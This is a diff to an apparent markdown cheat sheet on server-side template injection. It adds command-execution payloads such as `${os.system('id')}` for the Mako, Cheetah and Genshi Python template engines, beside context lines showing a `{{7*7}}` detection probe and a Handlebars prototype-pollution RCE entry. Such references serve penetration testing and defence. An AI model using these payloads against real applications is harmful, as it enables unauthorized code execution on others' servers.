@@ -108,6 +108,15 @@ In Twig 3.x, this is partially mitigated, but check for custom extensions implem
 | Detection | `{{7*7}}` |
 | RCE via Prototype Pollution | `{{#with "s" as |string|}}...{{/with}}` + proto chain |
 
+### Mako (Python)
+**Payload:** `${os.system('id')}`
+
+### Cheetah (Python)
+**Payload:** `$os.system('id')`
+
+### Genshi (Python)
+**Payload:** `<p py:content="os.system('id')">...</p>`
+
 ---
 
 ## 🧠 Engine Identification Algorithm
